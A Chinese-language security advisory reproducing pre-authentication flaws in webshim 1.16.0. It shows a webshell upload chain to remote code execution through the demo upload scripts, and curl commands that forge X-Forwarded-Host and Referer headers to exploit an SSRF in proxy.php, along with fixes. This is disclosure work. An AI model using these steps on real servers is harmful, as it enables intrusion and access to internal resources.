# webshim 前认证 RCE / SSRF 复现报告

- 目标项目：`aFarkas/webshim`（v1.16.0）
- 验证日期：2026-10-10
- 验证方式：Docker 默认 demo 部署 + 动态利用
- 结论：**前认证 RCE 成立，前认证 SSRF 成立**

---

## 1. 摘要

在 webshim 的默认 demo 部署下，成功复现两类前认证漏洞：

| 编号 | 漏洞 | 位置 | 结果 |
| --- | --- | --- | --- |
| V1 | 未认证任意文件上传 -> RCE | `demos/demos/filereader/upload_json.php` | 已复现 |
| V2 | 未认证任意文件上传 -> RCE | `demos/demos/filereader/upload_html.php` | 已复现 |
| V3 | Referer 校验绕过 SSRF | `src/shims/FlashCanvas/proxy.php`（及 `FlashCanvasPro` 副本） | 已复现 |

V1/V2 属同一根因家族：**服务端直接信任上传文件名并写入 Web 可访问目录，且该目录中的 `.php` 会被解释执行**，从而前认证闭合到命令执行。

同时，经动态验证，**路径遍历增强不成立**、**Header Injection 不成立**。

---

## 2. 环境与部署

### 2.1 源码获取说明

本次验证环境无法直连 `github.com`（连接超时），GitHub 代理镜像亦不可达。因此使用官方发布的 npm 包还原完整源码树：

```bash
npm pack webshim        # webshim-1.16.0.tgz
```

该包 `package.json` 的 `repository` 指向 `https://github.com/aFarkas/webshim.git`，且包含 `demos/`、`src/`、`js-webshim/`、`Gruntfile.js` 等全量源码，内容与仓库一致，可用于还原默认部署。

### 2.2 Docker 部署配置

`Dockerfile`：

```dockerfile
FROM php:8.3-apache

# 默认 demo 部署：整仓库复制进 Apache Web 根目录
COPY . /var/www/html/

# 确保 demo 上传落盘目录存在且 Web 用户可写
RUN mkdir -p /var/www/html/demos/demos/filereader/upload \
    && chown -R www-data:www-data /var/www/html/demos/demos/filereader/upload \
    && chmod -R 0777 /var/www/html/demos/demos/filereader/upload

EXPOSE 80
CMD ["apache2-foreground"]
```

`docker-compose.yml`：

```yaml
services:
  webshim:
    build:
      context: .
      dockerfile: Dockerfile
    image: webshim:1.16.0
    container_name: webshim-test
    ports:
      - "8080:80"
    restart: unless-stopped
```

部署：

```bash
docker compose up -d --build
```

- 镜像：`webshim:1.16.0`
- 容器：`webshim-test`
- 访问入口：`http://127.0.0.1:8080/`，demo 首页 `http://127.0.0.1:8080/demos/index.html`
- 运行时：`php:8.3-apache`（PHP 8.3.35，Apache + mod_php，`.php` 被解释执行）

### 2.3 部署条件确认

- Web 根目录：`/var/www/html`
- 上传落盘目录：`/var/www/html/demos/demos/filereader/upload`（存在、`www-data` 可写）
- 该目录未禁用 PHP 解释执行 -> 上传的 `.php` 可直接作为 WebShell 访问

---

## 3. V1 / V2：前认证任意文件上传 -> RCE

### 3.1 受影响文件

- `demos/demos/filereader/upload_json.php`
- `demos/demos/filereader/upload_html.php`

### 3.2 关键代码

`upload_json.php`：

```php
<?php
    header('Content-Type: application/json');
    $directory = "upload/";
    $a = 0;
    echo "[";
    foreach ($_FILES['pictures']['name'] as $nameFile) {
        if (is_uploaded_file($_FILES['pictures']['tmp_name'][$a])) {
            $success = move_uploaded_file($_FILES['pictures']['tmp_name'][$a], $directory . $_FILES['pictures']['name'][$a]);
            if(!$success){
                $success = 0;
            }
            echo '{"name": "'.$nameFile.'", "src": "'. $directory.$nameFile.'", "success": '.$success.'}';
        }
        $a++;
    }
    echo "]";
?>
```

`upload_html.php`：

```php
<?php
if (isset($_POST['send'])) {
    $directory = "upload/";
    $a = 0;
    foreach ($_FILES['pictures']['name'] as $nameFile) {
        if (is_uploaded_file($_FILES['pictures']['tmp_name'][$a])) {
            move_uploaded_file($_FILES['pictures']['tmp_name'][$a], $directory . $_FILES['pictures']['name'][$a]);
            echo $nameFile  .': <img src="'. $directory.$nameFile.'" /><br />';
        }
        $a++;
    }
}
?>
```

### 3.3 漏洞成因

两个接口问题一致：

1. **无认证**：无登录、会话、token 或权限判断；`upload_html.php` 的 `isset($_POST['send'])` 只是可伪造字段，不是认证边界。
2. **无扩展名校验**：允许上传任意后缀，含 `.php`。
3. **无 MIME / 魔数校验**：不检查真实内容类型。
4. **落盘目录位于 Web 根内且可执行**：`upload/` 相对 Web 根，`.php` 被解释执行。
5. **回显泄露落地路径**：JSON 返回 `src`，HTML 返回 `<img src="upload/...">`，便于直接取 WebShell URL。

### 3.4 完整利用链

```text
构造 multipart/form-data
  -> POST /demos/demos/filereader/upload_json.php   (或 upload_html.php，附带 send=Upload)
  -> is_uploaded_file() 通过
  -> move_uploaded_file() 将 shell.php 写入 upload/shell.php
  -> 响应回显 src=upload/shell.php
  -> GET /demos/demos/filereader/upload/shell.php?cmd=id
  -> PHP 解释执行 -> 前认证 RCE
```

### 3.5 动态复现结果

使用 `exp/` 下三个脚本对 `http://127.0.0.1:8080` 验证，全部命中：

- `exp/exploit_upload_rce.py http://127.0.0.1:8080/ id`
  ```text
  [*] Upload response: [{"name": "shell.php", "src": "upload/shell.php", "success": 1}]
  [*] Command output:
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

- `exp/exp_upload_json_rce.py http://127.0.0.1:8080 id`
  ```text
  [+] RCE confirmed via upload_json.php
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

- `exp/exp_upload_html_rce.py http://127.0.0.1:8080 id`
  ```text
  [+] RCE confirmed via upload_html.php
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

命令执行身份为 `www-data`（容器内 uid=33）。落盘的 WebShell 在
`/var/www/html/demos/demos/filereader/upload/` 下可直接被 HTTP 访问并执行。

### 3.6 风险评级

**Critical**，参考 CVSS `9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)`。

---

## 4. V3：FlashCanvas proxy.php 前认证 SSRF

### 4.1 受影响文件

- `src/shims/FlashCanvas/proxy.php`
- `src/shims/FlashCanvasPro/proxy.php`
- `js-webshim/dev/shims/FlashCanvas/proxy.php`
- `js-webshim/dev/shims/FlashCanvasPro/proxy.php`

### 4.2 关键逻辑

```php
function FCgetHostName() {
    if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {
        return $_SERVER['HTTP_X_FORWARDED_HOST'];
    } else if (isset($_SERVER['HTTP_HOST'])) {
        return $_SERVER['HTTP_HOST'];
    } else {
        return $_SERVER['SERVER_NAME'];
    }
}

$host = FCgetHostName();
$pattern = '#^https?://' . str_replace('.', '\\.', $host) . '(:\\d*)?/#';
if (!preg_match($pattern, $_SERVER['HTTP_REFERER'])) {
    exit;
}

$url = str_replace($search, $replace, $_GET['url']);
$ch = curl_init($url);
curl_exec($ch);
```

### 4.3 漏洞成因

设计上仅允许来自本站 Referer 的请求使用代理，但 Host 取值优先级错误地信任了客户端可控的
`HTTP_X_FORWARDED_HOST`。攻击者伪造：

```http
X-Forwarded-Host: attacker.com
Referer: http://attacker.com/
```

即可让 Referer 正则匹配通过。绕过后 `url` 参数仅要求以 `http(s)://` 开头，未限制目标域名/IP，
可代为请求内网资源并回显内容。

### 4.4 动态复现结果

对 `http://127.0.0.1:8080/src/shims/FlashCanvas/proxy.php` 验证：

- 无绕过头部（对照）：
  ```bash
  curl "http://127.0.0.1:8080/src/shims/FlashCanvas/proxy.php?url=http://127.0.0.1/readme.md"
  # len=0，脚本 exit，校验未通过
  ```

- 带绕过头部：
  ```bash
  curl -H "X-Forwarded-Host: attacker.com" -H "Referer: http://attacker.com/" \
    "http://127.0.0.1:8080/src/shims/FlashCanvas/proxy.php?url=http://127.0.0.1/readme.md"
  # 成功回显 readme.md 内容
  ```
  另一目标 `url=http://127.0.0.1/demos/index.html` 返回 96747 字节，证明可代服务器抓取内网资源。

> 注意：SSRF 目标需指向容器内部的 HTTP 服务（端口 80，即 `http://127.0.0.1/...`），
> 而非宿主映射端口 `8080`，因为容器内不监听 8080。

### 4.5 风险评级

**High**。本质为前认证 SSRF，可作为进一步利用的辅助条件，但不等同于直接 RCE。

---

## 5. 已否定的利用面

### 5.1 路径遍历增强（不成立）

上传代码直接拼接 `$directory . $_FILES['pictures']['name'][$a]`，初看疑似支持
`filename=../../shell.php` 跳出目录。但 PHP `rfc1867.c` multipart 解析器会对 `filename`
执行等价于 `basename()` 的路径剥离（自 PHP 4.3.9+ / 5.0.2+ 修复 CVE-2004-0535 后长期存在），
`../../shell.php` 只会落盘为 `shell.php`。该点不成立，且不影响主漏洞成立。

### 5.2 Header Injection（不成立）

`save.php` 中 `header('Content-Disposition: attachment; filename="' . $filename . '"')`
的 `$filename` 来自用户输入。现代 PHP 的 `header()` 会过滤 CR/LF，无法稳定构造响应头注入。
该点不构成可利用漏洞。

---

## 6. 影响

攻击者无需认证即可：

- 上传任意 PHP WebShell，以 Web 服务身份执行系统命令
- 读取站点源码与配置
- 通过 SSRF 代为访问内网 HTTP 资源
- 持久化后门文件

本次环境中命令执行身份为 `www-data`。

---

## 7. 修复建议

针对 V1/V2（上传 -> RCE）：

1. 不要在生产环境部署 demo 上传脚本（`demos/**/upload_*.php`）。
2. 上传目录移出 Web 根，避免上传文件可经 HTTP 直接访问。
3. 服务端强校验：扩展名白名单 + MIME/魔数双重校验（`finfo_file()`）。
4. 使用随机文件名重命名，禁用上传目录脚本执行（Apache 关闭该目录 PHP 解释）。
5. 删除演示用途的直传回显逻辑。

针对 V3（SSRF）：

1. 不要信任 `X-Forwarded-Host`；仅在可信反代场景下使用并校验来源。
2. 不要以 Referer 作为安全边界（可伪造）。
3. 对代理目标建立白名单，阻断环回/内网/云元数据地址。
4. 若无业务必要，删除该代理功能。

---

## 8. 复现步骤速查

```bash
# 1) 还原源码（npm 包，等价仓库内容）
npm pack webshim && tar xzf webshim-1.16.0.tgz && mv package webshim && cd webshim

# 2) 写入 Dockerfile 与 docker-compose.yml（见第 2.2 节）

# 3) 构建并启动
docker compose up -d --build           # 镜像 webshim:1.16.0，容器 webshim-test，8080->80

# 4) 验证
python3 exp/exploit_upload_rce.py    http://127.0.0.1:8080/ id
python3 exp/exp_upload_json_rce.py   http://127.0.0.1:8080 id
python3 exp/exp_upload_html_rce.py   http://127.0.0.1:8080 id
curl -H "X-Forwarded-Host: attacker.com" -H "Referer: http://attacker.com/" \
  "http://127.0.0.1:8080/src/shims/FlashCanvas/proxy.php?url=http://127.0.0.1/readme.md"
```

---

## 9. 最终判断

- **前认证 RCE（upload_json.php / upload_html.php）：成立，默认 Docker 部署下可直接利用。**
- **前认证 SSRF（FlashCanvas proxy.php 系列）：成立。**
- 路径遍历增强、Header Injection：不成立。
